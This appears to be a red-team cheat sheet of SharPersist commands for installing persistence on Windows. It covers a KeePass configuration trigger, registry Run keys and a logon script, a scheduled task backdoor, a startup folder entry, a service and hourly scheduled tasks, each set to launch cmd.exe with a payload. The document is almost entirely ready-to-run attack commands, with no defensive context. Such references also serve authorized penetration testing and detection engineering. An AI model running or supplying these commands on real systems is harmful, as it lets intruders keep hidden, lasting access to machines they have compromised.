
### KeePass

```
SharPersist -t keepass -c "C:\Windows\System32\cmd.exe" -a "/c meme.exe" f "C:\Users\username\AppData\Roaming\KeePass\KeePass.config.xml" -m add

```

### Registry
```
SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c meme.exe" -k "hkcurun" -v "Test Stuff" -m add

SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c meme.exe" -k "hkcurun" -v "Test Stuff" -m add -o env

SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c meme.exe" -k "logonscript" -m add
```

### Scheduled Task Backdoor
```
SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c meme.exe" -n "Something Cool" -m add
```
### Startup Folder
```
SharPersist -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c meme.exe" -f "Some File" -m add
```

### Windows Service
```
SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c meme.exe" -n "Some Service" -m add
```
### Scheduled Task
```
SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c echo 123 >> c:\123.txt" -n "Some Task" -m add

SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c echo 123 >> c:\123.txt" -n "Some Task" -m add -o hourly
```
